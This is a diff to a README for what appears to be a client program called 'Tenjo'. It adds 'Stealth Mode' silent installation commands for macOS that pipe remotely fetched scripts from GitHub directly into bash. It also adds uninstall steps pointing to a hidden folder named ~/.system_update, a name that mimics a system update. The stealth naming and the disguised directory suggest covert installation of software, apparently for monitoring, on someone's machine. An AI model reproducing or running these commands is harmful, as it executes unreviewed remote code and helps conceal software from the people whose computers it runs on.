@@ -2,7 +2,12 @@
 
 ## One-Line Remote Installation (Stealth Mode)
 
-### macOS - Silent Installation
+### macOS - Silent Installation (Recommended)
+```bash
+curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_macos.sh | bash -s true
+```
+
+### macOS - Alternative Method (if above fails)
 ```bash
 curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install_stealth_macos.sh | bash -s true cleanup
 ```
@@ -26,7 +31,12 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/A
 
 ## Uninstallation Commands
 
-### macOS
+### macOS (Quick Install Method)
+```bash
+bash ~/.system_update/uninstall.sh
+```
+
+### macOS (Alternative Method)
 ```bash
 bash ~/.system_update/uninstall_stealth_macos.sh true
 ```
